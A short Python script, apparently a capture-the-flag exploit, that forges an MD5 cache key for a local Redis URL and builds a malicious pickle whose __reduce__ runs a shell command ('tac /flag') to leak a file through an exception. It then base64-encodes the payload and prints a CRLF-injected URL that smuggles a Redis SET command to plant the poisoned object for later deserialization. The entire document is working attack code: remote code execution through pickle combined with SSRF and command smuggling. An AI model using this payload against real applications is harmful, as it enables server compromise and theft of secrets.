import hashlib
key = hashlib.md5("http://127.0.0.1:6379".encode()).hexdigest()

print(key)
#cbdecc92165b29374b6b62cca016d4f8
import os
from requests import Request ,Session
import pickle
import base64
from flask import render_template
class A():
    def __reduce__(self):
        return (exec, ("raise Exception(__import__('os').popen('tac /flag').read())",))



a = A()
a = pickle.dumps(a)
print(a)
value = base64.b64encode(a).decode('UTF-8')
print('127.0.0.1:6379?%0d%0aset%20'+key+'%20'+value+'%0d%0apadding%0d%0a')